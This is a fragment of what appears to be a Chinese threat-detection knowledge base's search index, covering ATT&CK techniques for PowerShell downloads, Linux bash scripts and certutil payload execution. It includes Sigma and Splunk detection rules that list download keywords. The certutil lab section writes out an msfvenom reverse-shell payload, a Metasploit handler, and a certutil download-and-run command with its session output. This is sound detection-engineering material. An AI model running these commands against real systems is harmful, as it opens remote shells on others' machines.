windows detection: selection: Image: - '*\\powershell.exe' - '*\\powershell_ise.exe' CommandLine: - '*Net.WebClient*' - '*DownloadFile*' - '*Invoke-WebRequest*' - '*Invoke-Shellcode*' - '*http*' - '*Start-BitsTransfer*' - '*IEX*' - '*mpcmdrun.exe*' condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_5","text":"\u5728\u4f7f\u7528Powershell\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\u65f6\uff0c\u6211\u4eec\u4e0d\u5efa\u8bae\u4f7f\u7528\u8fdb\u7a0b\u540d\u79f0\u52a0\u547d\u4ee4\u884c\u5173\u952e\u8bcd\u5339\u914d\u7684\u65b9\u5f0f\u8fdb\u884c\u68c0\u6d4b\u3002\u56e0\u4e3aPowershell\u4e8b\u4ef6ID\uff1a4104\u4e2d\u5e76\u4e0d\u5305\u542b\u8fdb\u7a0b\u4fe1\u606f\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-001-win-%E6%A3%80%E6%B5%8BPowerShell%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6/#_6","text":"MITRE-ATT&CK-T1059-001 https://attack.mitre.org/techniques/T1059/001/ PowerShell \u4e0b\u8f7d\u6587\u4ef6 https://www.pstips.net/powershell-download-files.html \u68c0\u6d4bPowershell\u4e0b\u8f7d\u6587\u4ef6\u884c\u4e3a https://github.com/microsoft/Microsoft-365-Defender-Hunting-Queries/blob/master/Execution/PowerShell%20downloads.txt Powershell\u4e0e\u5a01\u80c1\u72e9\u730e https://www.freebuf.com/articles/terminal/267080.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/","text":"T1059-004-linux-\u811a\u672c \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528Unix shell\u547d\u4ee4\u548c\u811a\u672c\u6765\u6267\u884c\u3002Unix shell\u662fLinux\u548cmacOS\u7cfb\u7edf\u4e0a\u7684\u4e3b\u8981\u547d\u4ee4\u63d0\u793a\u7b26\uff0c\u5c3d\u7ba1Unix shell\u5b58\u5728\u8bb8\u591a\u53d8\u4f53\uff08\u4f8b\u5982sh\uff0cbash\uff0czsh\u7b49\uff09\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7279\u5b9a\u7684OS\u6216\u53d1\u884c\u7248\u3002Unix shell\u53ef\u4ee5\u4f7f\u7528\u67d0\u4e9b\u8981\u6c42\u63d0\u5347\u7279\u6743\u7684\u547d\u4ee4\u6765\u63a7\u5236\u7cfb\u7edf\u7684\u5404\u4e2a\u65b9\u9762\u3002 Unix shell\u8fd8\u652f\u6301\u811a\u672c\uff0c\u8fd9\u4e9b\u811a\u672c\u652f\u6301\u987a\u5e8f\u6267\u884c\u547d\u4ee4\u4ee5\u53ca\u5176\u4ed6\u5178\u578b\u7684\u7f16\u7a0b\u64cd\u4f5c\uff0c\u4f8b\u5982\u6761\u4ef6\u548c\u5faa\u73af\u3002Shell\u811a\u672c\u7684\u5e38\u89c1\u7528\u6cd5\u5305\u62ec\u5197\u957f\u6216\u91cd\u590d\u7684\u4efb\u52a1\uff0c\u6216\u8005\u9700\u8981\u5728\u591a\u4e2a\u7cfb\u7edf\u4e0a\u8fd0\u884c\u540c\u4e00\u7ec4\u547d\u4ee4\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528Unix shell\u6765\u6267\u884c\u5404\u79cd\u547d\u4ee4\u6216\u6709\u6548\u8f7d\u8377\u3002\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u548c\u63a7\u5236\u901a\u9053\u6216\u5728\u6a2a\u5411\u79fb\u52a8\u671f\u95f4\uff08\u4f8b\u5982\u4f7f\u7528SSH\uff09\u8bbf\u95ee\u4ea4\u4e92\u5f0f\u5916\u58f3\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u5229\u7528Shell\u811a\u672c\u5728\u53d7\u5bb3\u8005\u4e0a\u4f20\u9012\u6216\u6267\u884c\u591a\u4e2a\u547d\u4ee4\uff0c\u6216\u8005\u4f5c\u4e3a\u7528\u4e8e\u6301\u4e45\u6027\u7684\u6709\u6548\u8f7d\u8377\u7684\u4e00\u90e8\u5206\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5982\u4f55\u5728linux\u4e0b\u8fdb\u884c\u6a21\u62df\u548c\u6d4b\u8bd5\uff1f\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u7b80\u5355bash\u811a\u672c\uff0c\u5e76\u6267\u884c\u5b83\u3002\u89c2\u5bdf\u5b83\u5728\u65e5\u5fd7\u4e2d\u7559\u4e0b\u7684\u75d5\u8ff9\u3002 \u68c0\u6d4b\u65e5\u5fd7 linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:/hacker$ bash 1.bash \u6d4b\u8bd5\u7559\u75d5 icbc@icbc:/$ cat /var/log/audit/audit.log type=SYSCALL msg=audit(1565352677.388:1524): arch=c000003e syscall=59 success=yes exit=0 a0=564608ddc330 a1=564608dbd8c0 a2=564608de3970 a3=8 items=2 ppid=2095 pid=2807 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=4 comm=\"bash\" exe=\"/usr/bin/bash\" key=\"auditcmd\" type=EXECVE msg=audit(1565352677.388:1524): argc=2 a0=\"bash\" a1=\"1.bash\" type=CWD msg=audit(1565352677.388:1524): cwd=\"/hacker\" type=PATH msg=audit(1565352677.388:1524): item=0 name=\"/usr/bin/bash\" inode=2228277 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 index = linux sourcetype = linux_audit syscall = 59 | table host\uff0csyscall\uff0csyscall_name\uff0cexe\uff0cauid \u5efa\u8bae \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6211\u4eec\u53ea\u662f\u628a\u73af\u5883\u4e2d\u7684\u811a\u672c\u6267\u884c\u884c\u4e3a\u8bb0\u5f55\u4e0b\u6765\uff0c\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u767d\u540d\u5355\uff0c\u90a3\u4e48\u6211\u4eec\u9700\u8981\u6d88\u8017\u5927\u91cf\u7684\u7cbe\u529b\u7528\u4e8e\u5904\u7406\u8bef\u62a5\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1059-004 https://attack.mitre.org/techniques/T1059/004/ Audit\u914d\u7f6e\u624b\u518c https://www.cnblogs.com/bldly1989/p/7204358.html","title":"T1059-004-linux-\u811a\u672c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#t1059-004-linux-","text":"","title":"T1059-004-linux-\u811a\u672c"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528Unix shell\u547d\u4ee4\u548c\u811a\u672c\u6765\u6267\u884c\u3002Unix shell\u662fLinux\u548cmacOS\u7cfb\u7edf\u4e0a\u7684\u4e3b\u8981\u547d\u4ee4\u63d0\u793a\u7b26\uff0c\u5c3d\u7ba1Unix shell\u5b58\u5728\u8bb8\u591a\u53d8\u4f53\uff08\u4f8b\u5982sh\uff0cbash\uff0czsh\u7b49\uff09\uff0c\u5177\u4f53\u53d6\u51b3\u4e8e\u7279\u5b9a\u7684OS\u6216\u53d1\u884c\u7248\u3002Unix shell\u53ef\u4ee5\u4f7f\u7528\u67d0\u4e9b\u8981\u6c42\u63d0\u5347\u7279\u6743\u7684\u547d\u4ee4\u6765\u63a7\u5236\u7cfb\u7edf\u7684\u5404\u4e2a\u65b9\u9762\u3002 Unix shell\u8fd8\u652f\u6301\u811a\u672c\uff0c\u8fd9\u4e9b\u811a\u672c\u652f\u6301\u987a\u5e8f\u6267\u884c\u547d\u4ee4\u4ee5\u53ca\u5176\u4ed6\u5178\u578b\u7684\u7f16\u7a0b\u64cd\u4f5c\uff0c\u4f8b\u5982\u6761\u4ef6\u548c\u5faa\u73af\u3002Shell\u811a\u672c\u7684\u5e38\u89c1\u7528\u6cd5\u5305\u62ec\u5197\u957f\u6216\u91cd\u590d\u7684\u4efb\u52a1\uff0c\u6216\u8005\u9700\u8981\u5728\u591a\u4e2a\u7cfb\u7edf\u4e0a\u8fd0\u884c\u540c\u4e00\u7ec4\u547d\u4ee4\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u6ee5\u7528Unix shell\u6765\u6267\u884c\u5404\u79cd\u547d\u4ee4\u6216\u6709\u6548\u8f7d\u8377\u3002\u53ef\u4ee5\u901a\u8fc7\u547d\u4ee4\u548c\u63a7\u5236\u901a\u9053\u6216\u5728\u6a2a\u5411\u79fb\u52a8\u671f\u95f4\uff08\u4f8b\u5982\u4f7f\u7528SSH\uff09\u8bbf\u95ee\u4ea4\u4e92\u5f0f\u5916\u58f3\u3002\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u5229\u7528Shell\u811a\u672c\u5728\u53d7\u5bb3\u8005\u4e0a\u4f20\u9012\u6216\u6267\u884c\u591a\u4e2a\u547d\u4ee4\uff0c\u6216\u8005\u4f5c\u4e3a\u7528\u4e8e\u6301\u4e45\u6027\u7684\u6709\u6548\u8f7d\u8377\u7684\u4e00\u90e8\u5206\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_1","text":"\u5982\u4f55\u5728linux\u4e0b\u8fdb\u884c\u6a21\u62df\u548c\u6d4b\u8bd5\uff1f\u6211\u4eec\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u7b80\u5355bash\u811a\u672c\uff0c\u5e76\u6267\u884c\u5b83\u3002\u89c2\u5bdf\u5b83\u5728\u65e5\u5fd7\u4e2d\u7559\u4e0b\u7684\u75d5\u8ff9\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_2","text":"linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_3","text":"icbc@icbc:/hacker$ bash 1.bash","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_4","text":"icbc@icbc:/$ cat /var/log/audit/audit.log type=SYSCALL msg=audit(1565352677.388:1524): arch=c000003e syscall=59 success=yes exit=0 a0=564608ddc330 a1=564608dbd8c0 a2=564608de3970 a3=8 items=2 ppid=2095 pid=2807 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=4 comm=\"bash\" exe=\"/usr/bin/bash\" key=\"auditcmd\" type=EXECVE msg=audit(1565352677.388:1524): argc=2 a0=\"bash\" a1=\"1.bash\" type=CWD msg=audit(1565352677.388:1524): cwd=\"/hacker\" type=PATH msg=audit(1565352677.388:1524): item=0 name=\"/usr/bin/bash\" inode=2228277 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#splunk","text":"index = linux sourcetype = linux_audit syscall = 59 | table host\uff0csyscall\uff0csyscall_name\uff0cexe\uff0cauid","title":"splunk\u89c4\u5219"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_6","text":"\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u6211\u4eec\u53ea\u662f\u628a\u73af\u5883\u4e2d\u7684\u811a\u672c\u6267\u884c\u884c\u4e3a\u8bb0\u5f55\u4e0b\u6765\uff0c\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u767d\u540d\u5355\uff0c\u90a3\u4e48\u6211\u4eec\u9700\u8981\u6d88\u8017\u5927\u91cf\u7684\u7cbe\u529b\u7528\u4e8e\u5904\u7406\u8bef\u62a5\u3002","title":"\u5efa\u8bae"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-004-linux-%E8%84%9A%E6%9C%AC/#_7","text":"MITRE-ATT&CK-T1059-004 https://attack.mitre.org/techniques/T1059/004/ Audit\u914d\u7f6e\u624b\u518c https://www.cnblogs.com/bldly1989/p/7204358.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/","text":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Certutil.exe\u6267\u884cPayload \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u6682\u65e0\u5408\u9002\u5206\u7c7b\uff0c\u7f6e\u653e\u5728\u6b64TID\u4e2d \u547d\u4ee4\u884c\u754c\u9762\u662f\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u5f88\u591a\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u7279\u6027\u3002\u4f8b\u5982\uff0cWindows\u7cfb\u7edf\u4e0a\u7684\u547d\u4ee4\u884c\u754c\u9762cmd\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u547d\u4ee4\u884c\u754c\u9762\u53ef\u5728\u672c\u5730\u4ea4\u4e92\u6216\u8005\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u3001\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u8fdc\u7a0b\u4ea4\u4e92\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u9700\u8981\u8c03\u7528\u8fdb\u7a0b\u6765\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\uff08\u4f8b\u5982\uff0c\u5b9a\u65f6\u4efb\u52a1\uff09\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b Certutil.exe\u662f\u4f5c\u4e3a\u8bc1\u4e66\u670d\u52a1\u7684\u4e00\u90e8\u5206\u5b89\u88c5\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6b64\u5de5\u5177\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\u6076\u610fEXE\u6587\u4ef6\uff0c\u5e76\u83b7\u53d6meterpreter\u4f1a\u8bdd\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09 \u6d4b\u8bd5\u590d\u73b0 \u73af\u5883\u51c6\u5907 \u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\uff09 \u653b\u51fb\u5206\u6790 \u751f\u6210payload.exe \u901a\u8fc7msfvenom \u751f\u6210\u6076\u610f\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528start multi/handler\u83b7\u53d6\u76ee\u6807\u8ba1\u7b97\u673a\u53cd\u5411shell\u4f1a\u8bdd\u3002 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.126.146 lport=1234 -f exe > shell.exe \u6267\u884c\u76d1\u542c msf5 > use exploit/multi/handler msf5 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp payload => windows/meterpreter/reverse_tcp msf5 exploit(multi/handler) > set lhost 192.168.126.146 lhost => 192.168.126.146 msf5 exploit(multi/handler) > set lport 1234 lport => 1234 msf5 exploit(multi/handler) > exploit [*] Started reverse TCP handler on 192.168.126.146:1234 \u5f00\u542f\u5c0f\u578bhttp\u670d\u52a1 root@12306Br0:~# python2 -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... \u9776\u673a\u6267\u884cpayload certutil.exe -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe & shell.exe \u53cd\u5f39shell [*] Started reverse TCP handler on 192.168.126.146:1234 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Sending stage (180291 bytes) to 192.168.126.149 [*] Meterpreter session 1 opened (192.168.126.146:1234 -> 192.168.126.149:49172) at 2020-04-17 15:59:50 +0800 \u6d4b\u8bd5\u7559\u75d5 #sysmon\u65e5\u5fd7 EventID: 1 Image: C:\\Windows\\System32\\certutil.exe FileVersion: 6.1.7600.16385 (win7_rtm.090713-1255) Description: CertUtil.exe Product: Microsoft\u00ae Windows\u00ae Operating System Company: Microsoft Corporation OriginalFileName: CertUtil.exe CommandLine: certutil.exe -urlcache -split -f http://192.168.126.146:1234/shell.exe shell.exe #win7\u5b89\u5168\u65e5\u5fd7 EventID\uff1a4688 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID:0xbcc \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\certutil.exe #windows server 2008(\u4e0d\u542b2008)\u4ee5\u4e0a\u7cfb\u7edf\u53ef\u4ee5\u914d\u7f6e\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa\u7b56\u7565\uff0c\u8fbe\u5230\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570\u7684\u6548\u679c\u3002\u901a\u8fc7\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u76d1\u63a7\u5206\u6790\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u53ef\u7591\u7684Certutil\u547d\u4ee4 status: experimental description: \u4f7f\u7528\u8bf8\u5982\u201cdecode\u201d\u5b50\u547d\u4ee4\u4e4b\u7c7b\u7684\u5b50\u547d\u4ee4\u68c0\u6d4b\u53ef\u7591\u7684Microsoft certutil\u6267\u884c\uff0c\u8be5\u5b50\u547d\u4ee4\u6709\u65f6\u7528\u4e8e\u4f7f\u7528\u5185\u7f6e\u7684certutil\u5b9e\u7528\u7a0b\u5e8f references: - https://twitter.com/JohnLaTwC/status/835149808817991680 - https://twitter.com/subTee/status/888102593838362624 - https://twitter.com/subTee/status/888071631528235010 - https://blogs.technet.microsoft.com/pki/2006/11/30/basic-crl-checking-with-certutil/ - https://www.trustedsec.com/2017/07/new-tool-release-nps_payload/ - https://twitter.com/egre55/status/1087685529016193025 - https://lolbas-project.github.io/lolbas/Binaries/Certutil/ logsource: category: process_creation product: windows detection: selection: CommandLine: - '* -decode *' - '* /decode *' - '* -decodehex *' - '* /decodehex *' - '* -urlcache *' - '* /urlcache *' - '* -verifyctl *' - '* /verifyctl *' - '* -encode *' - '* /encode *' - '*certutil* -URL*' - '*certutil* /URL*' - '*certutil* -ping*' - '*certutil* /ping*' condition: selection fields: - CommandLine - ParentCommandLine tags: - attack.defense_evasion - attack.t1140 - attack.t1105 - attack.t1059 - attack.s0189 - attack.g0007 falsepositives: - False positives depend on scripts and administrative tools used in the monitored environment level: high \u5efa\u8bae \u6839\u636e\u8fdb\u7a0b\u521b\u5efa\u4e8b\u4ef64688/1\uff08\u8fdb\u7a0b\u540d\u79f0\u3001\u547d\u4ee4\u884c\uff09\u8fdb\u884c\u76d1\u63a7\u3002\u672c\u76d1\u63a7\u65b9\u6cd5\u9700\u8981\u81ea\u884c\u5b89\u88c5\u914d\u7f6e\u5ba1\u6838\u7b56\u7565/sysmon\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1059 https://attack.mitre.org/techniques/T1059/","title":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Certutil.exe\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#t1059-win-certutilexepayload","text":"","title":"T1059-win-\u57fa\u4e8e\u767d\u540d\u5355Certutil.exe\u6267\u884cPayload"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#attck","text":"\u6682\u65e0\u5408\u9002\u5206\u7c7b\uff0c\u7f6e\u653e\u5728\u6b64TID\u4e2d \u547d\u4ee4\u884c\u754c\u9762\u662f\u4e0e\u8ba1\u7b97\u673a\u7cfb\u7edf\u4ea4\u4e92\u7684\u4e00\u79cd\u65b9\u5f0f\uff0c\u5e76\u4e14\u662f\u5f88\u591a\u64cd\u4f5c\u7cfb\u7edf\u5e73\u53f0\u7684\u5e38\u89c1\u7279\u6027\u3002\u4f8b\u5982\uff0cWindows\u7cfb\u7edf\u4e0a\u7684\u547d\u4ee4\u884c\u754c\u9762cmd\u53ef\u7528\u4e8e\u6267\u884c\u8bb8\u591a\u4efb\u52a1\uff0c\u5305\u62ec\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002\u547d\u4ee4\u884c\u754c\u9762\u53ef\u5728\u672c\u5730\u4ea4\u4e92\u6216\u8005\u901a\u8fc7\u8fdc\u7a0b\u684c\u9762\u5e94\u7528\u3001\u53cd\u5411shell\u4f1a\u8bdd\u7b49\u8fdc\u7a0b\u4ea4\u4e92\u3002\u6267\u884c\u7684\u547d\u4ee4\u4ee5\u547d\u4ee4\u884c\u754c\u9762\u8fdb\u7a0b\u7684\u5f53\u524d\u6743\u9650\u7ea7\u522b\u8fd0\u884c\uff0c\u9664\u975e\u8be5\u547d\u4ee4\u9700\u8981\u8c03\u7528\u8fdb\u7a0b\u6765\u66f4\u6539\u6743\u9650\u4e0a\u4e0b\u6587\uff08\u4f8b\u5982\uff0c\u5b9a\u65f6\u4efb\u52a1\uff09\u3002 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u4f7f\u7528\u547d\u4ee4\u884c\u754c\u9762\u4e0e\u7cfb\u7edf\u4ea4\u4e92\u5e76\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\u6267\u884c\u5176\u4ed6\u8f6f\u4ef6\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_1","text":"Certutil.exe\u662f\u4f5c\u4e3a\u8bc1\u4e66\u670d\u52a1\u7684\u4e00\u90e8\u5206\u5b89\u88c5\u7684\u547d\u4ee4\u884c\u7a0b\u5e8f\u3002 \u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u6b64\u5de5\u5177\u5728\u76ee\u6807\u8ba1\u7b97\u673a\u4e0a\u6267\u884c\u6076\u610fEXE\u6587\u4ef6\uff0c\u5e76\u83b7\u53d6meterpreter\u4f1a\u8bdd\u3002 \u8865\u5145\u8bf4\u660e\uff1a\u5728\u9ad8\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u7b56\u7565\uff0c\u5bf9\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\u8fdb\u884c\u8bb0\u5f55\u3002\u65e5\u5fd7\u7b56\u7565\u5f00\u542f\u65b9\u6cd5\uff1a \u672c\u5730\u8ba1\u7b97\u673a\u7b56\u7565>\u8ba1\u7b97\u673a\u914d\u7f6e>\u7ba1\u7406\u6a21\u677f>\u7cfb\u7edf>\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa>\u5728\u8fc7\u7a0b\u521b\u5efa\u4e8b\u4ef6\u4e2d\u52a0\u5165\u547d\u4ee4\u884c>\u542f\u7528 \uff0c\u540c\u6837\u4e5f\u53ef\u4ee5\u5728\u4e0d\u540c\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u90e8\u7f72sysmon\uff0c\u901a\u8fc7sysmon\u65e5\u5fd7\u8fdb\u884c\u76d1\u63a7\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7/SYSMON\u65e5\u5fd7\uff08\u9700\u8981\u81ea\u884c\u5b89\u88c5\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_4","text":"\u653b\u51fb\u673a\uff1aKali2019 \u9776\u673a\uff1awin7\uff08sysmon\uff09","title":"\u73af\u5883\u51c6\u5907"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#_5","text":"","title":"\u653b\u51fb\u5206\u6790"},{"location":"0x4_%E6%89%A7%E8%A1%8C/T1059-win-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Certutil.exe%E6%89%A7%E8%A1%8CPayload/#payloadexe","text":"\u901a\u8fc7msfvenom \u751f\u6210\u6076\u610f\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5e76\u4f7f\u7528start multi/handler\u83b7\u53d6\u76ee\u6807\u8ba1\u7b97\u673a\u53cd\u5411shell\u4f1a\u8bdd\u3002 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.126.146 lport=1234 -f exe > 